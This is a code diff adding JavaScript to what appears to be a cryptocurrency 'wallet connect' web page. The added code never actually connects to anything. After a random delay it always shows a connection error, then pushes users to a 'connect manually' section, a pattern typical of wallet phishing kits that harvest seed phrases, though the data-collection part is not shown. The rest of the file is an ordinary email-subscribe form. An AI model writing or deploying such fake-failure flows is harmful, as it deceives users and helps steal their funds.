@@ -1,5 +1,79 @@
 
 
+document.addEventListener("DOMContentLoaded", function() {
+  var errorSection = document.querySelector(".error-section");
+  var connectingSection = document.querySelector(".connecting-section");
+  var manualSection = document.querySelector(".manual-section");
+  var connectBox = document.querySelector(".connect-box");
+  var closeButton = document.getElementById("close-button");
+  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
+  var walletConnectCard = this.documentElement.querySelector(".wallet-connect-card");
+  var walletIcon = document.getElementById("coin-logo");
+  var tryAgain = document.querySelector(".try-again");
+  var connectManually = document.querySelector(".connect-manually");
+
+function errorConnecting() {
+  connectingSection.style.display = "none";
+  errorSection.style.display = "block";
+  manualSection.style.display = "none";
+}
+function retryConnecting() {
+  connectingSection.style.display = "block";
+  errorSection.style.display = "none";
+  manualSection.style.display = "none";
+  var errorTime = Math.floor(Math.random() * (6000 - 2000 + 1)) + 2000;
+  setTimeout(function() {
+    errorConnecting();
+  }, errorTime);
+}
+
+  walletIcon.addEventListener("click", function() {
+    errorConnecting();
+  });
+  tryAgain.addEventListener("click", function() {
+    retryConnecting();
+  });
+  connectManually.addEventListener("click", function() {
+    connectingSection.style.display = "none";
+    errorSection.style.display = "none";
+    manualSection.style.display = "block";
+  });
+
+  closeButton.addEventListener("click", function() {
+    connectBox.style.display = "none";
+    connectingSection.style.display = "block";
+    errorSection.style.display = "none";
+    manualSection.style.display = "none";
+  });
+
+  walletConnectCard.addEventListener("click", function() {
+    connectBox.style.display = "flex";
+    manualSection.style.display = "none";
+    setTimeout(function() {
+      errorConnecting();
+    }, errorTime);
+  });
+
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 var submitButton = document.getElementById("subscribe-mail");
 var emailField = document.getElementById("email");
 var invalidEmail = document.getElementById("invalid-email");
@@ -31,7 +105,6 @@ emailField.addEventListener("blur", function() {
 
 submitButton.addEventListener("click", function(event) {
   event.preventDefault();
-  // Check if email is valid
   if (!emailField.checkValidity()) {
     invalidEmail.style.display = "flex";
     emailField.style.border = "1px solid red";
@@ -65,8 +138,4 @@ submitButton.addEventListener("click", function(event) {
 }
   sendMail();
 });
-
-
-
-
 
